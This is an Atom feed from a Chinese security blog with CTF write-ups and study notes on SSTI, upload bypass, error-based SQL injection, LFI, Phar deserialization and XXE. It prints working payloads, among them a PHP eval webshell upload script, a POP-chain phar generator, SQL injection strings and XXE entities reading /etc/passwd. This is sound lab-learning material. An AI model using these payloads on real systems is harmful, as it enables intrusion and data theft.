@@ -1,0 +1,1523 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://skyblu3519.github.io</id>
+    <title>skkyblu3&apos;s Blog</title>
+    <updated>2023-07-09T12:16:11.319Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://skyblu3519.github.io"/>
+    <link rel="self" href="https://skyblu3519.github.io/atom.xml"/>
+    <subtitle>sky, blue and ...</subtitle>
+    <logo>https://skyblu3519.github.io/images/avatar.png</logo>
+    <icon>https://skyblu3519.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, skkyblu3&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[一周CTF（5）]]></title>
+        <id>https://skyblu3519.github.io/post/yizhouctf5/</id>
+        <link href="https://skyblu3519.github.io/post/yizhouctf5/">
+        </link>
+        <updated>2023-07-09T12:06:30.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="buu">BUU</h1>
+<h2 id="cscctf-2019-qualflasklight">[CSCCTF 2019 Qual]FlaskLight</h2>
+<p>SSTI<br>
+<img src="https://skyblu3519.github.io/post-images/1688904471812.png" alt="" loading="lazy"></p>
+<p><code>[].__class__.__base__.__subclasses__()</code>获得object子类，过滤了<code>globals</code>，但是子类中有<code>subprocess.Popen</code>，可以直接执行命令：<code>?search={{[].__class__.__base__.__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
+<p>flag位置为<code>/flasklight/coomme_geeeett_youur_flek</code>，ez😄<br>
+<img src="https://skyblu3519.github.io/post-images/1688904481308.png" alt="" loading="lazy"></p>
+<h2 id="wustctf2020cv-maker">[WUSTCTF2020]CV Maker</h2>
+<p>文件上传，修改文件头绕过。</p>
+<p>注册登录进去有一个头像上传功能，随便上传一个<code>txt</code>，页面提示<code>exif_imagetype not image!</code>。</p>
+<p>修改文件头<code>GIF89</code>，上传PHP<br>
+<img src="https://skyblu3519.github.io/post-images/1688904519393.png" alt="" loading="lazy"></p>
+<p>ezez<br>
+<img src="https://skyblu3519.github.io/post-images/1688904512125.png" alt="" loading="lazy"></p>
+<h2 id="gwctf-2019枯燥的抽奖">[GWCTF 2019]枯燥的抽奖</h2>
+<p>从源码中知道<code>check.php</code>的存在，这里写了判断逻辑</p>
+<pre><code class="language-php">&lt;?php
+# 这不是抽奖程序的源代码！不许看！
+header(&quot;Content-Type: text/html;charset=utf-8&quot;);
+session_start();
+if(!isset($_SESSION['seed'])){
+$_SESSION['seed']=rand(0,999999999);
+}
+
+mt_srand($_SESSION['seed']);
+$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+$str='';
+$len1=20;
+for ( $i = 0; $i &lt; $len1; $i++ ){
+    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
+}
+$str_show = substr($str, 0, 10);
+echo &quot;&lt;p id='p1'&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;
+
+
+if(isset($_POST['num'])){
+    if($_POST['num']===$str){x
+        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p&gt;&quot;;
+    }
+    else{
+        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;
+    }
+}
+show_source(&quot;check.php&quot;);
+</code></pre>
+<p>根据代码得知知道seed就可以知道最后的str，使用的工具是<a href="https://github.com/openwall/php_mt_seed">php_mt_seed</a>。（ARM无法使用，暂时搁置）<br>
+<a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a><br>
+<a href="https://blog.csdn.net/RABCDXB/article/details/119246038">https://blog.csdn.net/RABCDXB/article/details/119246038</a></p>
+<h2 id="nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook</h2>
+<p><a href="https://skyblu3519.github.io/post/nctf2019true-xml-cookbook/">题解</a></p>
+<h2 id="rctf2015easysql">[RCTF2015]EasySQL</h2>
+<p>二次注入。</p>
+<p>注册用户名为<code>admin&quot;</code>登录，在修改密码的页面产生报错。修改密码的语句可能</p>
+<pre><code class="language-sql">UPDATE users SET PASSWORD=&quot;$pass&quot; WHERE username=&quot;$username&quot; and password=&quot;$curr_pass&quot;
+</code></pre>
+<p>注册<code>admin&quot;#</code>登录修改密码可以改掉admin的密码，但是里面并没有东西。</p>
+<p>报错注入</p>
+<ul>
+<li><code>or</code>过滤使用<code>||</code>代替</li>
+<li>空格、<code>/**/</code>过滤使用<code>()</code>代替</li>
+<li></li>
+</ul>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#
+
+XPATH syntax error: '~article,flag,users~'
+
+admin&quot;||(updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e),1)),0x7e),1))#
+
+XPATH syntax error: '~name,pwd,email,real_flag_1s_her'
+</code></pre>
+<p>从没有末尾的～得知结果不全。经过测试，过滤了substr和mid。为了获取完整的列名使用正则匹配<code>regexp</code></p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&amp;&amp;(column_name)regexp('^r')),0x7e),1)),0x7e),1))#
+
+XPATH syntax error: '~real_flag_1s_here~'
+
+admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#
+
+XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx'
+</code></pre>
+<p>使用刚刚的方法查以<code>f</code>开头的内容</p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^f')),0x7e),1))#
+
+XPATH syntax error: '~flag{4bf92c23-fc90-4f55-849d-2a'
+
+admin&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^2a')),0x7e),1))#
+想这样查后面的内容，不知道为什么不行
+</code></pre>
+<p>使用reverse()读取剩下的内容</p>
+<pre><code class="language-sql">admin&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)REGEXP('^f'))),0x7e),1))#
+
+XPATH syntax error: '~}5c030d9faea2-d948-55f4-09cf-32'
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688904642595.png" alt="" loading="lazy"></figure>
+<p>这个REGEXP之后抽时间再看看吧🥱</p>
+<h2 id="ciscn2019-华北赛区-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2>
+<p><a href="https://skyblu3519.github.io/post/phar-fan-xu-lie-hua-xue-xi/#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web1dropbox">题解</a></p>
+<h2 id="npuctf2020ezinclude">[NPUCTF2020]ezinclude</h2>
+<p>根据提示GET穿参，<code>?name=&amp;pass=</code>。set-cookie中有hash字段，传入的pass对应这个hash，使用bp开始跳转。</p>
+<p><code>/flflflflag.php</code>中存在文件包含<br>
+<img src="https://skyblu3519.github.io/post-images/1688904703234.png" alt="" loading="lazy"></p>
+<p>考点：<a href="https://qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/">php7 segment fault特性</a></p>
+<p>解法：跑个脚本</p>
+<pre><code class="language-php">import requests
+from io import BytesIO
+
+payload = &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;
+data={'file': BytesIO(payload.encode())}
+url=&quot;http://5ce4fabc-571d-413f-9fa5-e49806f39a19.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;
+r=requests.post(url=url,files=data,allow_redirects=False)
+</code></pre>
+<p>访问扫描出的<code>dir.php</code>，得到tmp下生成的文件名<br>
+<img src="https://skyblu3519.github.io/post-images/1688904724191.png" alt="" loading="lazy"><br>
+包含执行<code>phpinfo()</code>得到flag。<br>
+<img src="https://skyblu3519.github.io/post-images/1688904730213.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Phar 反序列化学习]]></title>
+        <id>https://skyblu3519.github.io/post/phar-fan-xu-lie-hua-xue-xi/</id>
+        <link href="https://skyblu3519.github.io/post/phar-fan-xu-lie-hua-xue-xi/">
+        </link>
+        <updated>2023-07-06T11:44:50.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>kilig sky☁️</p>
+</blockquote>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="phar文件">Phar文件</h2>
+<p>Phar 文件是 PHP Archive 的缩写，可以理解为 PHP 的“归档文件”或者“压缩包”。就像 Java 中的 JAR 文件，或者 Unix 中的 tar 文件一样，Phar 文件允许你将一个或多个文件打包成一个单独的文件。</p>
+<p>Phar 文件的主要优点在于它提供了一种简单的方法来分发和部署 PHP 应用。你可以将一个完整的 PHP 应用（包括 PHP 源文件、图像文件、数据文件等）打包成一个 Phar 文件，然后将这个 Phar 文件分发给你的用户。用户只需要一个 Phar 文件就可以运行你的应用，而无需手动安装或管理多个文件。</p>
+<h3 id="举个例子">举个例子</h3>
+<p>首先在php.ini中修改<code>phar.readonly</code>这个选项，去掉前面的分号，并改值为<code>Off</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1688644529661.png" alt="" loading="lazy"></p>
+<p>现在我们下面这样的目录结构：</p>
+<pre><code class="language-shell">➜  htdocs tree phar 
+phar
+└── myapp
+    └── src
+        └── hello.php
+</code></pre>
+<p><code>hello.php</code>文件中的内容如下：</p>
+<pre><code class="language-php">&lt;?php
+phpinfo();
+</code></pre>
+<p>接下来，我们创建一个 PHP 来打包<code>myapp</code>为一个<code>Phar</code>文件。在<code>phar</code>目录下外创建一个名为 <code>create.php</code>的文件，内容如下：</p>
+<pre><code class="language-php">&lt;?php
+try {
+    // 创建一个新的 Phar 文件
+    $phar = new Phar('myapp.phar', 0, 'myapp.phar');
+
+    // 开始缓冲内容，让我们可以添加文件
+    $phar-&gt;startBuffering();
+
+    // 将 'myapp' 目录的内容添加到 Phar 文件
+    $phar-&gt;buildFromDirectory(__DIR__ . '/myapp');
+
+    // 设置默认的引导文件（此例中为 'src/hello.php'）
+    $phar-&gt;setDefaultStub('src/hello.php', 'src/hello.php');
+
+    // 停止缓冲并保存 Phar 文件
+    $phar-&gt;stopBuffering();
+
+    echo &quot;Phar file myapp.phar was created successfully.\n&quot;;
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>成功创建<code>myapp.phar</code></p>
+<pre><code class="language-shell">➜  htdocs tree phar              
+phar
+├── create.php
+├── myapp
+│   └── src
+│       └── hello.php
+└── myapp.phar
+</code></pre>
+<p>现在我们在<code>phar</code>下创建一个<code>index.php</code>，在里面用include包含刚刚创建的<code>myapp.phar</code>。</p>
+<pre><code class="language-php">&lt;?php
+include 'myapp.phar';
+</code></pre>
+<p>由于我们在创建<code>myapp.phar</code>时设置了引导文件，它是Phar文件被执行时首先运行的代码段，所以这里会直接执行<code>phpinfo()</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688645051116.png" alt="" loading="lazy"></p>
+<h2 id="phar协议">Phar协议</h2>
+<p>phar协议是一个在 PHP 中用于访问 Phar 文件内容的特殊流包装器（stream wrapper）。其实不光是Phar 文件，phar协议还可以访问其他类型的压缩包，如 zip 和 tar 。使用的方式为：<code>phar://压缩包/内部文件</code>。</p>
+<p>将<code>hello.php</code>压缩为<code>hello.zip</code>使用<code>phar://hello.zip/hello.php</code>包含（phar协议解析对phar以外的文件，似乎不能访问它们里面目录下的文件。如果将myapp压缩，<code>phar://myapp.zip/src/hello.php</code>是无法包含到的）</p>
+<pre><code class="language-php">&lt;?php
+include('phar://hello.zip/hello.php');
+</code></pre>
+<p>这里也就知道了phar怎么在文件包含中利用了。</p>
+<h2 id="phar反序列化">Phar反序列化</h2>
+<p>首先需要对Phar文件结构有个基础的了解。</p>
+<h3 id="phar文件结构">Phar文件结构</h3>
+<p>Phar文件主要包含三至四个部分</p>
+<ol>
+<li>a stub</li>
+<li>a manifest describing the contents</li>
+<li>the file contents</li>
+<li><code>[optional]</code> a signature for verifying Phar integrity (phar file format only)</li>
+</ol>
+<p><strong>a stub</strong><br>
+<code>stub</code>是一个简单的PHP文件，一个最基础<code>stub</code>格式如下：</p>
+<pre><code class="language-php">&lt;?php __HALT_COMPILER();
+</code></pre>
+<p><code>stub</code>的内容没有任何限制，但必须以<code>__HALT_COMPILER();</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
+<p>Ps.PHP的解释器碰到<code>__HALT_COMPILER();</code> 时解析就会停止，此函数后面的所有内容都将被忽略。之前安洵杯那道反序列化考过。</p>
+<p><strong>a manifest describing the contents</strong><br>
+Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点<br>
+<img src="https://skyblu3519.github.io/post-images/1688648391238.png" alt="" loading="lazy"></p>
+<p><strong>the file contents</strong><br>
+被压缩文件的内容。</p>
+<p><strong>a signature for verifying Phar integrity</strong><br>
+签名，放在文件末尾。</p>
+<h3 id="利用方式">利用方式</h3>
+<p>生成phar文件的代码，<code>phar.php</code>：</p>
+<pre><code class="language-php">&lt;?php
+class TestObject {
+}
+try {
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $o-&gt;name = 'skyblu3';
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>验证代码，<code>unphar.php</code></p>
+<pre><code class="language-php">&lt;?php
+class TestObject{
+    function __destruct()
+    {
+        echo $this -&gt; name; 
+    }
+}
+include('phar://phar.phar');
+</code></pre>
+<p>用十六进制编辑器打开生成的<code>phar.phar</code>，可以看到其中meta-data的序列化内容<br>
+<img src="https://skyblu3519.github.io/post-images/1688649452899.png" alt="" loading="lazy"></p>
+<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br>
+<img src="https://skyblu3519.github.io/post-images/1688649557098.png" alt="" loading="lazy"></p>
+<p>Ps.在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<pre><code class="language-php">&lt;?php
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+</code></pre>
+<h1 id="ciscn2019-华北赛区-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1>
+<p>注册登录进去上传图片，这里的下载功能存在任意文件读取<br>
+<img src="https://skyblu3519.github.io/post-images/1688650728707.png" alt="" loading="lazy"></p>
+<p>读取index.php，注意这里要用相对路径<code>./../../index.php</code>。关键的文件有几个<code>index.php</code>，<code>login.php</code>，<code>class.php</code>，<code>download.php</code>。</p>
+<p>首先审计代码对流程有了基本的了解之后就可以开始考虑如何利用了。利用点在<code>class.php</code></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$dbaddr = &quot;127.0.0.1&quot;;
+$dbuser = &quot;root&quot;;
+$dbpass = &quot;root&quot;;
+$dbname = &quot;dropbox&quot;;
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this-&gt;db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;store_result();
+        $count = $stmt-&gt;num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);
+        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
+        $stmt-&gt;execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this-&gt;user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . &quot;SiAchGHmFx&quot;);
+        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);
+        $stmt-&gt;bind_param(&quot;s&quot;, $username);
+        $stmt-&gt;execute();
+        $stmt-&gt;bind_result($expect);
+        $stmt-&gt;fetch();
+        if (isset($expect) &amp;&amp; $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this-&gt;db-&gt;close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this-&gt;files = array();
+        $this-&gt;results = array();
+        $this-&gt;funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(&quot;.&quot;, $filenames);
+        unset($filenames[$key]);
+        $key = array_search(&quot;..&quot;, $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file-&gt;open($path . $filename);
+            array_push($this-&gt;files, $file);
+            $this-&gt;results[$file-&gt;name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this-&gt;funcs, $func);
+        foreach ($this-&gt;files as $file) {
+            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;';
+        $table .= '&lt;thead&gt;&lt;tr&gt;';
+        foreach ($this-&gt;funcs as $func) {
+            $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;' . htmlentities($func) . '&lt;/th&gt;';
+        }
+        $table .= '&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;';
+        $table .= '&lt;/thead&gt;&lt;tbody&gt;';
+        foreach ($this-&gt;results as $filename =&gt; $result) {
+            $table .= '&lt;tr&gt;';
+            foreach ($result as $func =&gt; $value) {
+                $table .= '&lt;td class=&quot;text-center&quot;&gt;' . htmlentities($value) . '&lt;/td&gt;';
+            }
+            $table .= '&lt;td class=&quot;text-center&quot; filename=&quot;' . htmlentities($filename) . '&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;';
+            $table .= '&lt;/tr&gt;';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this-&gt;filename = $filename;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this-&gt;filename);
+    }
+
+    public function size() {
+        $size = filesize($this-&gt;filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this-&gt;filename);
+    }
+
+    public function close() {
+        return file_get_contents($this-&gt;filename);
+    }
+}
+</code></pre>
+<p>为了读取到flag，路径为<code>/flag.txt</code>。可以清晰的看到<code>File::close</code>存在<code>file_get_contents</code>方法，构造思路也比较简单，找到反序列化的入口<code>User::__destruct</code>顺着理下来就完事儿了。</p>
+<p>唯一比较绕的就是<code>FileList</code>中的属性构造，不过审计的时候看清代码流程跟着走一遍也不难就是。</p>
+<p>pop链构造+phar文件生成：</p>
+<pre><code class="language-php">&lt;?php
+
+class User {
+    public $db;
+    public function __construct(){
+        $this-&gt;db = new FileList();
+    }
+}
+class FileList {
+    private $files = array();
+    private $results = array();
+    public function __construct(){
+        array_push($this-&gt;files, new File());
+        $this-&gt;results['flag.txt'] = array();
+    }
+}
+
+class File{
+    public $filename = '/flag.txt';
+}
+
+try {
+    @unlink(&quot;phar.phar&quot;);
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new User();
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+} catch (Exception $e) {
+    // 捕获并打印任何异常
+    echo &quot;Error: &quot; . $e-&gt;getMessage();
+}
+</code></pre>
+<p>上传文件，修改<code>Content-Type: image/jpeg</code>即可任意文件上传，上传文件后缀会自动变为<code>jpg</code>，不过也不影响phar解析。<br>
+<img src="https://skyblu3519.github.io/post-images/1688655062417.png" alt="" loading="lazy"></p>
+<p>至于漏洞的触发点，通过刚刚的学习可以知道<code>File::open</code>中的<code>file_exists($filename)</code>会触发phar反序列化。<code>download.php</code>和<code>delete.php</code>中均可以触发，但是<code>download.php</code>使用<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code> 对操作目录进行了限制。<br>
+<img src="https://skyblu3519.github.io/post-images/1688655042508.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688655048797.png" alt="" loading="lazy"></p>
+<p>点击删除抓包，修改filename触发反序列化，成功get flag<br>
+<img src="https://skyblu3519.github.io/post-images/1688655164405.png" alt="" loading="lazy"></p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://paper.seebug.org/680/#23-phar">利用 phar 拓展 php 反序列化漏洞攻击面</a><br>
+<a href="https://www.freebuf.com/articles/web/205943.html">PHAR反序列化拓展操作总结</a><br>
+<a href="https://blog.csdn.net/u011474028/article/details/54973571">php归档格式：phar文件详解（创建、使用、解包还原提取）</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[NCTF2019]True XML cookbook]]></title>
+        <id>https://skyblu3519.github.io/post/nctf2019true-xml-cookbook/</id>
+        <link href="https://skyblu3519.github.io/post/nctf2019true-xml-cookbook/">
+        </link>
+        <updated>2023-07-04T13:13:24.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>给我一个接口！</p>
+</blockquote>
+<p>JUST4FUN</p>
+<h1 id="解题流程">解题流程</h1>
+<p>登录功能存在XXE，回显点为username。验证</p>
+<pre><code class="language-xml">&lt;!DOCTYPE foo [
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+<p>这里也可以用伪协议读<code>doLogin.php</code>，但没什么东西<br>
+<img src="https://skyblu3519.github.io/post-images/1688476779184.png" alt="" loading="lazy"></p>
+<p>瞄下WP，知道这道题需要用XXE探测内网主机，flag就在存活的主机上。</p>
+<p>问题来了，探测内网主机，需要知道本机的网络地址。现在可以用XXE读取文件，那么什么文件中存储着IP的信息呢？</p>
+<p><code>/etc/hosts</code>这里存储着主机名和IP的映射关系，如果有内网主机的映射的话是可能知道的，但这里并没有<br>
+<img src="https://skyblu3519.github.io/post-images/1688477139942.png" alt="" loading="lazy"></p>
+<p>直接读网卡配置文件呢？首先看下系统的版本，这里读取<code>/etc/issue</code>，知道了系统版本为<code>Debian GNU/Linux 10</code>。通过搜索，可以知道该版本的网卡配置文件为<code>/etc/network/interfaces</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688477435554.png" alt="" loading="lazy"></p>
+<p>读取失败，可能是不存在该文件，也可能是权限不够。</p>
+<p>再看下WP，这里就有点不同了。很多WP中都是读<code>/proc/net/arp</code>这个文件，这里面记录了网卡的ARP信息，通过里面的IP地址得到主机网段的地址。不过，可能是现在这道题改了，这个文件读出的内容为</p>
+<pre><code>IP address       HW type     Flags       HW address            Mask     Device
+10.128.253.12    0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0
+169.254.1.1      0x1         0x2         ee:ee:ee:ee:ee:ee     *        eth0
+</code></pre>
+<p>首先是这两个IP的MAC都是无效的。虽然<code>10.128.253.12</code>是一个内网地址，但是<code>10.128.253.0/24</code>这个网段并没有内容。</p>
+<p>还有个值得一提的点，<code>169.254.1.1</code>这也是个内网地址（真·第一次知道）。</p>
+<blockquote>
+<p>169.254.0.0/16为私有地址，但是较为特殊，称为Local Link Address（LLA）。<br>
+主机的网卡配置为DHCP，但是在网络中找不到DHCP服务器或者被BAN，那么系统会为自己分配一个169.254.0.0/16地址。</p>
+</blockquote>
+<p><code>/proc/net</code>目录包含的文件可以提供网络堆栈的各种统计信息和配置详情，其中<code>/proc/net/fib_trie</code>提供了关于内核IP路由表的信息。<br>
+<img src="https://skyblu3519.github.io/post-images/1688478833093.jpg" alt="" loading="lazy"></p>
+<p>找到了内网网段<code>10.244.80.0/24</code>，后面就是正常操作了。</p>
+<p>爆破探测主机<br>
+<img src="https://skyblu3519.github.io/post-images/1688478908923.png" alt="" loading="lazy"></p>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/1688478935209.png" alt="" loading="lazy"></p>
+<h1 id="补充">补充</h1>
+<p>下面交给ChatGPT</p>
+<h2 id="procnetfib_trie是什么">/proc/net/fib_trie是什么？</h2>
+<p><code>/proc/net/fib_trie</code> 文件是 Linux 系统的一部分，它提供了有关系统的路由表的信息。具体来说，该文件表示的是内核中的前缀树（trie）路由表的状态。这是一种数据结构，用于存储和查找 IP 路由。</p>
+<p>在这个上下文中，FIB 表示 &quot;Forwarding Information Base&quot;。这是网络设备用于决定如何将数据包转发到目标地址的信息集。实际上，FIB 是路由器从其路由表（包含了从路由器到所有可能目标的所有已知路径）中派生出来的。当数据包到达路由器时，路由器会查看 FIB 来决定如何转发数据包。</p>
+<p><code>fib_trie</code>文件以一种特殊的、树状的格式展示这些信息，每一行代表树的一个节点。这个文件可能对于网络研究人员或者进行深度诊断的系统管理员有用，但它的格式对于常规的系统使用或者网络管理可能有些复杂。</p>
+<h2 id="它和procnetroute文件有什么区别">它和/proc/net/route文件有什么区别？</h2>
+<p><code>/proc/net/fib_trie</code> 和 <code>/proc/net/route</code> 都是 Linux 系统中的文件，都用于表示系统的路由信息，但它们的主要区别在于呈现这些信息的方式。</p>
+<p><code>/proc/net/route</code> 文件以表格形式呈现路由信息。每一行代表一个路由条目，包括目标网络、网关、标志、引用计数、使用情况、度量值（metric）等信息。这些信息都是以十六进制格式显示的，需要进行转换才能理解。</p>
+<p><code>/proc/net/fib_trie</code> 文件则提供了一种更详细的查看路由信息的方式。它显示了内核路由表的前缀树（trie）数据结构，这是一种专门用于高效存储和检索 IP 地址信息的数据结构。文件的每一行代表前缀树的一个节点。在树中，每个 IP 地址都是从根节点开始的一条路径，这样可以使 IP 地址的查找和匹配更快速、高效。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[XXE 学习笔记]]></title>
+        <id>https://skyblu3519.github.io/post/xxe-xue-xi/</id>
+        <link href="https://skyblu3519.github.io/post/xxe-xue-xi/">
+        </link>
+        <updated>2023-07-03T12:19:24.000Z</updated>
+        <content type="html"><![CDATA[<p>本文所用的测试代码</p>
+<pre><code class="language-php">&lt;?php
+$input = &lt;&lt;&lt;STR
+# 这里写XML
+STR;
+;
+
+# 设置libxml库的实体加载器为false，可能会处理来自请求XML中定义的外部实体。
+libxml_disable_entity_loader (false);   
+$xmlfile = $input;
+$dom = new DOMDocument(); 
+# 加载XML数据。选项LIBXML_NOENT和LIBXML_DTDLOAD分别表示启用实体替换和加载DTD。
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
+# SimpleXMLElement对象使得处理XML数据更加简单    
+$creds = simplexml_import_dom($dom);
+# 打印整个XML文档
+echo $creds-&gt;asXML();
+</code></pre>
+<h1 id="背景知识">背景知识</h1>
+<h2 id="概念">概念</h2>
+<ul>
+<li><strong>XML</strong>：即可扩展标记语言（Extensible Markup Language），被设计用于在网络上进行信息传输和存储。</li>
+<li><strong>XXE</strong>：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</li>
+<li><strong>DTD</strong>：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)。</li>
+</ul>
